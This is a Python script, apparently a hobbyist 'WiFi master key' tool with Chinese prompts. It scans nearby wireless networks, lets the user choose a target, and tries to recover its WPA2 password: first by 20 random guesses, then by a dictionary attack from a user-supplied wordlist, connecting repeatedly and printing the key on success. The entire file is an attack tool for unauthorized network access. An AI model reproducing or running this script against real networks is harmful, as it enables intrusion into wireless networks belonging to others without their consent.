import pywifi
import time
import random
import string
from pywifi import const

def gen_pwd(l=10):
    s = string.ascii_letters+string.digits
    return ''.join(random.sample(s, l))

def try_conn(ssid, pwd):
    wifi = pywifi.PyWiFi()
    iface = wifi.interfaces()[0]
    iface.disconnect()
    while iface.status() == 4: pass
    prof = pywifi.Profile()
    prof.ssid = ssid
    prof.auth = const.AUTH_ALG_OPEN
    prof.akm.append(const.AKM_TYPE_WPA2PSK)
    prof.cipher = const.CIPHER_TYPE_CCMP
    prof.key = pwd
    iface.remove_all_network_profiles()
    tmp = iface.add_network_profile(prof)
    iface.connect(tmp)
    t0 = time.time()
    while time.time()-t0 < 1.5:
        if iface.status() == 4:
            print("密码:", pwd)
            exit()
    return False

def wifi_password_crack(wifi_name):
    for _ in range(20):
        pwd = gen_pwd(8)
        if try_conn(wifi_name, pwd):
            return pwd
    path = input("字典路径:")
    with open(path) as f:
        for pwd in f:
            pwd = pwd.strip()
            if try_conn(wifi_name, pwd):
                return pwd

def wifi_scan():
    wifi = pywifi.PyWiFi()
    interface = wifi.interfaces()[0]
    interface.scan()
    for i in range(4):
        time.sleep(1)
        print('\r扫描可用 WiFi 中，请稍后。。。（' + str(3 - i), end='')
    print('\r扫描完成！\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('编号', '信号强度', 'wifi名'))
    bss = interface.scan_results()
    wifi_name_set = set()
    for w in bss:
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    return wifi_name_list

def main():
    exit_flag = 0
    target_num = -1
    while not exit_flag:
        try:
            print('WiFi万能钥匙'.center(35, '-'))
            wifi_list = wifi_scan()
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('请选择你要尝试破解的wifi：'))
                    if target_num in range(len(wifi_list)):
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'你选择要破解的WiFi名称是：{wifi_list[target_num][1]}，确定吗？（Y/N）'))
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                else:
                                    print('只能输入 Y/N 哦o(*￣︶￣*)o')
                            except ValueError:
                                print('只能输入 Y/N 哦o(*￣︶￣*)o')
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('请重新输入哦(*^▽^*)')
                except ValueError:
                    print('只能输入数字哦o(*￣︶￣*)o')
            wifi_password_crack(wifi_list[target_num][1])
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e

if __name__ == '__main__':
    main()